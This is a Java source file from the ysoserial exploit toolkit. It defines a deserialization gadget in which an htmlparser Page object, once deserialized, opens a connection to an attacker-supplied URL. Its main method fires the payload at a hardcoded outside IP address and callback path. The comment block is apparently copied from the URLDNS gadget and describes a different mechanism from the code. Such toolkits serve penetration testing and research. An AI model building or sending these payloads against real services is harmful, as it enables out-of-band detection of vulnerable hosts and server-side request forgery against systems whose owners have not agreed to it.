package ysoserial.payloads;

import org.htmlparser.lexer.Page;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   org/htmlparser/lexer/Page.readObject(Ljava/io/ObjectInputStream;)V (1)
 *   1. java/net/URL.openConnection()Ljava/net/URLConnection; (0)
 *   connect url~
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies("org.htmlparser.htmlparser-1.6")
@Authors({ Authors.ANGELWHU })
public class HtmlParserPage implements ObjectPayload<Object> {
        public Object getObject(final String url) throws Exception {
                Page p = new Page();
                p.setBaseUrl(url);
                p.setUrl(url);
                URL url_try = new URL(url);
                p.setConnection(url_try.openConnection());
                return p;
        }

        public static void main(final String[] args) throws Exception {
                //PayloadRunner.run(URLDNS.class, args);
                PayloadRunner.run(HtmlParserPage.class, new String[]{"http://39.106.143.48:8283/p/1c75f6/aQpd/"});
        }
}
